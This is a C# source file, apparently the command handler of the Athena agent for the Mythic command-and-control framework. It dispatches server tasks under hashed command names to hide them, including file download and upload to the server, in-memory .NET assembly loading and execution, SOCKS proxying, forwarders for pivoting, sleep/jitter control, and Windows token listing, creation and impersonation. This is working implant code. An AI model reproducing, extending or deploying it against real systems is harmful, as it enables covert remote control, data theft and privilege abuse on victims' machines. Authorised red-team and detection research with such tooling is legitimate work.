
﻿#if DEBUG
    //#define WINBUILD
#endif
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Text;
using Athena.Plugins;
using Newtonsoft.Json;

namespace Athena.Commands
{
    public class CommandHandler
    {
        public delegate void SetSleepAndJitterHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> SetSleepAndJitter;
        public delegate void SetForwarderHandler(object sender, ProfileEventArgs e);
        public event EventHandler<ProfileEventArgs> SetForwarder;
        public delegate void SetProfileHandler(object sender, ProfileEventArgs e);
        public event EventHandler<ProfileEventArgs> SetProfile;
        public delegate void StartForwarderHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StartForwarder;
        public delegate void StopForwarderHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StopForwarder;
        public delegate void StartSocksHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StartSocks;
        public delegate void StopSocksHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StopSocks;
        public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> ExitRequested;
        private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
        private AssemblyHandler assemblyHandler { get; }
        private DownloadHandler downloadHandler { get; }
        private UploadHandler uploadHandler { get; }
#if WINBUILD
        private TokenHandler tokenHandler { get; }
#endif
        private ConcurrentBag<object> responseResults { get; set; }
        public CommandHandler()
        {
            this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
            this.assemblyHandler = new AssemblyHandler();
            this.downloadHandler = new DownloadHandler();
            this.uploadHandler = new UploadHandler();
            this.responseResults = new ConcurrentBag<object>();

#if WINBUILD

            this.tokenHandler = new TokenHandler();
#endif
        }
        /// <summary>
        /// Initiate a task provided by the Mythic server
        /// </summary>
        /// <param name="task">MythicTask object containing the parameters of the task</param>
        public async Task StartJob(MythicTask task)
        {
            MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
            job.started = true;
#if WINBUILD
            if(task.token != 0)
            {
                if(!await this.tokenHandler.ThreadImpersonate(task.token))
                {
                    this.responseResults.Add(new ResponseResult()
                    {
                        task_id = task.id,
                        user_output = "Failed to switch context!",
                        status = "errored",
                        completed = "true",
                    });
                    return;
                }
            }
#endif
            switch (job.task.command.ToHash())
            {
                case "FD456406745D816A45CAE554C788E754": //download
                    if (!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
                    }
                    break;
                case "C6E6495DF88816EAC7376920027393A4": //execute-assembly
                    this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "F24F62EEB789199B9B2E467DF3B1876B": //Exit
                    RequestExit(job);
                    break;
                case "27A06A9E3D5E7F67EB604A39536208C9": //jobs
                    this.responseResults.Add(await this.GetJobs(task.id));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "363AFEF7C118EEDBD908495180280BB7": //jobkill
                    if (this.activeJobs.ContainsKey(task.parameters))
                    {
                        this.activeJobs[task.parameters].cancellationtokensource.Cancel();
                        this.responseResults.Add(new ResponseResult
                        {
                            user_output = "Cancelled job",
                            completed = "true",
                            task_id = job.task.id,
                        });
                    }
                    else
                    {
                        this.responseResults.Add(new ResponseResult
                        {
                            user_output = "Job doesn't exist",
                            completed = "true",
                            task_id = job.task.id,
                            status = "error"
                        });
                    }
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "2A304A1348456CCD2234CD71A81BD338": //link
                    StartInternalForwarder(job); //I could maybe make this a loadable plugin? it may require some changes to how delegates are passed
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "1CDEDE1665F21542BDE8DD9F3C4E362E": //list-profiles
                    //test
                    break;
                case "EC4D1EB36B22D19728E9D1D23CA84D1C": //load
                    this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "790C1BE487AC4162A26A760E50AE619A": //load-assembly
                    this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job)); //I bet I could make this a plugin by using the current app context
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "E659634F6A18B0CACD0AB3C3A95845A7": //reset-assembly-context
                    this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                    UpdateSleepAndJitter(job);
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);


                    if (((string)socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
                    {
                        StartSocksProxy(job);
                    }
                    else
                    {
                        StopSocksProxy(job);
                    }
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "5D343B8042C5EE2EA7C892C5ECC16E30": //stop-assembly
                    this.responseResults.Add(new ResponseResult
                    {
                        user_output = "Not implemented yet.",
                        completed = "true",
                        task_id = job.task.id,
                    });
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "48C8331B1BF8E91B67A05C697C05259F": //switch-profile
                    
                    
#if WINBUILD
                case "94A08DA1FECBB6E8B46990538C7B50B2": //token
                    var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if (String.IsNullOrEmpty((string)tokenInfo["username"]))
                    {
                        this.responseResults.Add(await this.tokenHandler.ListTokens(job)); //This could definitely be a plugin...I think. Explore tomorrow
                    }
                    else
                    {
                        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
                    }

                    this.activeJobs.Remove(task.id, out _);
                    break;
#endif
                case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                    StopInternalForwarder(job);
                    this.activeJobs.Remove(task.id, out _); //plugin-able if we move link there
                    break;
                case "F972C1D6198BAF47DD8FD9A05832DB0F": //unload
                    this.responseResults.Add(await assemblyHandler.UnloadCommands(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "76EE3DE97A1B8B903319B7C013D8C877": //upload
                    if(!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await uploadHandler.StartUploadJob(job));
                    }
                    break;
                default:
                    ResponseResult rr = (ResponseResult)await CheckAndRunPlugin(job);
                    
                    if(rr is not null)
                    {
                        this.responseResults.Add(rr);
                        this.activeJobs.Remove(task.id, out _);

                    }

                    break;
            }
#if WINBUILD
            if (task.token != 0)
            {
                await this.tokenHandler.ThreadRevert();
            }
#endif
        }
        /// <summary>
        /// EventHandler to begin exit
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void RequestExit(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            ExitRequested(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to start socks proxy
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StartSocksProxy(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StartSocks(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to stop socks proxy
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StopSocksProxy(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StopSocks(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to start internal forwarder
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StartInternalForwarder(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StartForwarder(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to stop internal forwarder
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StopInternalForwarder(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StopForwarder(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to update sleep and jitter
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void UpdateSleepAndJitter(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            SetSleepAndJitter(this, exitArgs);
        }
        /// <summary>
        /// Cancel a currently executing job
        /// </summary>
        /// <param name="task">MythicTask containing the task id to cancel</param>
        public async Task StopJob(MythicTask task)
        {
            //todo
        }

        /// <summary>
        /// EventHandler to update sleep and jitter
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void SwitchProfile(MythicJob job)
        {
            ProfileEventArgs switchArgs = new ProfileEventArgs(job);
            SetSleepAndJitter(this, switchArgs);
        }

        /// <summary>
        /// Provide a list of repsonses to the MythicClient
        /// </summary>
        public async Task<List<object>> GetResponses()
        {
            List<object> responses = this.responseResults.ToList<object>();
            this.responseResults.Clear();

            if (this.assemblyHandler.assemblyIsRunning)
            {
                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
            }

            responses.AddRange(await PluginHandler.GetResponses());

            foreach(ResponseResult response in responses)
            {
                if (this.activeJobs.ContainsKey(response.task_id) && response.completed ==  "true")
                {
                    this.activeJobs.Remove(response.task_id, out _);
                }
            }

            return responses;
        }
        /// <summary>
        /// Add a ResponseResult to the response list
        /// </summary>
        /// <param name="response">ResposneResult or inherited object containing the task results</param>
        public async Task AddResponse(object response)
        {
            this.responseResults.Add(response);
        }
        /// <summary>
        /// Add multiple ResponseResult to the response list
        /// </summary>
        /// <param name="response">ResposneResult or inherited object containing the task results</param>
        public async Task AddResponse(List<object> responses)
        {
            List<object> tmpResponse = new List<object>();
            responses.ForEach(response => tmpResponse = this.responseResults.Prepend<object>(response).ToList());
            this.responseResults = new ConcurrentBag<object>(tmpResponse);
        }
        /// <summary>
        /// Get the currently running jobs
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        private async Task<ResponseResult> GetJobs(string task_id)
        {
            List<object> jobs = new List<object>();

            foreach(var j in this.activeJobs)
            {
                var test = new
                {
                    id = j.Value.task.id,
                    status = j.Value.started ? "started" : "queued",
                    command = j.Value.task.command
                };
                jobs.Add(test);
            }

            return new ResponseResult()
            {
                user_output = JsonConvert.SerializeObject(jobs),
                task_id = task_id,
                completed = "true"
            };
        }     
        /// <summary>
        /// Check if a plugin is already loaded and execute it
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        private async Task<object> CheckAndRunPlugin(MythicJob job)
        {
            if (await this.assemblyHandler.IsCommandLoaded(job.task.command))
            {
                return await this.assemblyHandler.RunLoadedCommand(job);
            }
            else
            {
                return new ResponseResult()
                {
                    completed = "true",
                    user_output = "Plugin not loaded. Please use the load command to load the plugin!",
                    task_id = job.task.id,
                    status = "error",
                };
            }
        }
        /// <summary>
        /// Begin the next process of the upload task
        /// </summary>
        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
        public async Task HandleUploadPiece(MythicResponseResult response)
        {
            MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                this.activeJobs.Remove(response.task_id, out _);
                await this.uploadHandler.CompleteUploadJob(response.task_id);
            }

            if(uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }
            if (!String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
                uploadJob.chunk_num++;
                if (response.chunk_num == uploadJob.total_chunks)
                {
                    await this.uploadHandler.CompleteUploadJob(response.task_id);
                    this.activeJobs.Remove(response.task_id, out _);
                    this.responseResults.Add(new UploadResponse
                    {
                        task_id=response.task_id,
                        completed = "true",
                        upload = new UploadResponseData
                        {
                            chunk_num = uploadJob.chunk_num,
                            file_id = response.file_id,
                            chunk_size = uploadJob.chunk_size,
                            full_path = uploadJob.path
                        }
                    });
                }
                else
                {
                    this.responseResults.Add(new UploadResponse
                    {
                        task_id = response.task_id,
                        upload = new UploadResponseData
                        {
                            chunk_num = uploadJob.chunk_num,
                            file_id = response.file_id,
                            chunk_size = uploadJob.chunk_size,
                            full_path = uploadJob.path
                        }
                    });
                }

            }
            else
            {
                this.responseResults.Add(new ResponseResult
                {
                    status = "error",
                    completed = "true",
                    task_id = response.task_id,
                    user_output = "Mythic sent no data to upload!"

                });
            }
        }
        /// <summary>
        /// Begin the next process of the download task
        /// </summary>
        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
        public async Task HandleDownloadPiece(MythicResponseResult response)
        {
            MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
            if (downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                this.activeJobs.Remove(response.task_id, out _);
                await this.uploadHandler.CompleteUploadJob(response.task_id);
            }

            if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
            {
                await this.downloadHandler.CompleteDownloadJob(response.task_id);
                this.activeJobs.Remove(response.task_id, out _);
                this.responseResults.Add(new DownloadResponse
                {
                    task_id = response.task_id,
                    status = "error",
                    user_output = "No file_id received",
                    completed = "true"
                });
            }
            else
            {
                if (String.IsNullOrEmpty(downloadJob.file_id))
                {
                    downloadJob.file_id = response.file_id;
                }

                if (response.status == "success")
                {
                    if (downloadJob.chunk_num != downloadJob.total_chunks)
                    {
                        downloadJob.chunk_num++;

                        this.responseResults.Add(new DownloadResponse
                        {
                            task_id = response.task_id,
                            user_output = String.Empty,
                            status = "processed",
                            full_path = String.Empty,
                            total_chunks = -1,
                            file_id = downloadJob.file_id,
                            chunk_num = downloadJob.chunk_num,
                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
                        });
                    }
                    else
                    {
                        await this.downloadHandler.CompleteDownloadJob(response.task_id);
                        this.activeJobs.Remove(response.task_id, out _);
                        this.responseResults.Add(new DownloadResponse
                        {
                            task_id = response.task_id,
                            user_output = String.Empty,
                            status = String.Empty,
                            full_path = String.Empty,
                            chunk_num = downloadJob.chunk_num,
                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob),
                            file_id = downloadJob.file_id,
                            completed = "true",
                            total_chunks = -1

                        });
                    }
                }
                else
                {
                    this.responseResults.Add(new DownloadResponse
                    {
                        task_id = response.task_id,
                        file_id = downloadJob.file_id,
                        chunk_num = downloadJob.chunk_num,
                        chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
                    });
                }
            }
        }
        /// <summary>
        /// Check if an upload job exists
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        public async Task<bool> HasUploadJob(string task_id)
        {
            return await this.uploadHandler.ContainsJob(task_id);
        }
        /// <summary>
        /// Check if a download job exists
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        public async Task<bool> HasDownloadJob(string task_id)
        {
            return await this.downloadHandler.ContainsJob(task_id);
        }   
    }
}
